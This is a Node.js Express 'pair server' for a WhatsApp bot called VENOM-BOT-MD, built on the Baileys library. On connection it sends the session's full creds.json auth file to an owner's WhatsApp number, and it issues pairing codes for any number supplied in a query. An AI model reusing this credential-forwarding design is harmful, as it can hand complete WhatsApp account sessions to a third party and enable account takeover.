const express = require("express");
const fs = require("fs");
const path = require("path");
const pino = require("pino");

const {
  default: makeWASocket,
  useSingleFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason
} = require("@whiskeysockets/baileys");

const app = express();

// ملف مؤقت لتخزين creds قبل الإرسال
const tempCredsPath = path.join(__dirname, "creds.json");

// رقمك فـ واتساب (بدون +)
const OWNER_NUMBER = process.env.OWNER_NUMBER;
if(!OWNER_NUMBER) throw new Error("Set OWNER_NUMBER environment variable!");

// ✅ تشغيل البوت
let sock;
let isConnected = false;

async function connectSocket() {
  // ephemeral auth state
  const { state, saveCreds } = useSingleFileAuthState(tempCredsPath);

  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    logger: pino({ level: "info" }),
    auth: state,
    browser: ["VENOM-BOT-MD","CHROME","1.0.0"],
    version,
  });

  sock.ev.on("creds.update", async (newCreds) => {
    saveCreds();
  });

  sock.ev.on("connection.update", async (update) => {
    console.log(update);

    const { connection, lastDisconnect } = update;

    if(connection === "close"){
      const reason = lastDisconnect?.error?.output?.statusCode;
      console.log("🔴 Disconnected:", reason);
      isConnected = false;
      if(reason !== DisconnectReason.loggedOut){
        console.log("♻️ Reconnecting...");
        connectSocket();
      }
    }

    if(connection === "open"){
      console.log("✅ BOT READY FOR PAIRING");
      isConnected = true;

      // إرسال creds.json للواتساب
      try{
        if(fs.existsSync(tempCredsPath)){
          const credsBuffer = fs.readFileSync(tempCredsPath);
          await sock.sendMessage(
            OWNER_NUMBER + "@s.whatsapp.net",
            {
              document: credsBuffer,
              mimetype: "application/json",
              fileName: "creds.json"
            }
          );
          console.log("📩 creds.json sent to owner!");
          // مسح الملف بعد الإرسال
          fs.unlinkSync(tempCredsPath);
        }
      }catch(e){
        console.log("❌ Error sending creds:", e);
      }
    }
  });
}

// تشغيل البوت
connectSocket();

// 🌐 واجهة pairing code
app.get("/pair", async (req,res)=>{
  const number = req.query.number;
  if(!number) return res.send("Enter Number");

  if(!isConnected || !sock?.user){
    return res.send("BOT not ready yet, wait a few seconds...");
  }

  try{
    let code = await sock.requestPairingCode(number);
    code = code.match(/.{1,4}/g).join("-");
    res.send(code);
  }catch(e){
    console.log(e);
    res.send("Error: Connection Closed");
  }
});

// واجهة HTML
app.get("/",(req,res)=>{
  res.sendFile(path.join(__dirname, "index.html"));
});

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT,()=>{
  console.log(`🕷️ VENOM-BOT-MD PAIR SERVER RUNNING at http://localhost:${PORT}`);
});
